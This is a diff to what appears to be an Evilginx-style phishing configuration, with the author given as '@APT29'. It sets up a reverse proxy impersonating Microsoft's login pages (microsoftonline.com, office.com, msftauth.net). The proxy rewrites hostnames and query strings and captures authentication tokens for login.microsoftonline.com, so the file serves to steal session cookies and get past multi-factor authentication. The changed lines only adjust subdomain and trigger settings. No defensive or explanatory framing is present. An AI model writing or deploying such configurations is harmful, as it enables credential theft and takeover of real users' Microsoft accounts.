@@ -3,15 +3,15 @@ author: '@APT29'
 min_ver: '2.4.0'
 
 proxy_hosts:
-  - {phish_sub: 'random', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
   - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, auto_filter: true, is_landing:false}
 
 sub_filters:
-  - {triggers_on: 'random.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'random.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
   # Filter to remove query parameters from URLs in the HTML content
-  - {triggers_on: 'random.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '\?([^"&#]*)', replace: '', mimes: ['text/html'], redirect_only: false}
+  - {triggers_on: 'microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '\?([^"&#]*)', replace: '', mimes: ['text/html'], redirect_only: false}
 
 auth_tokens:
   - domain: '.login.microsoftonline.com'
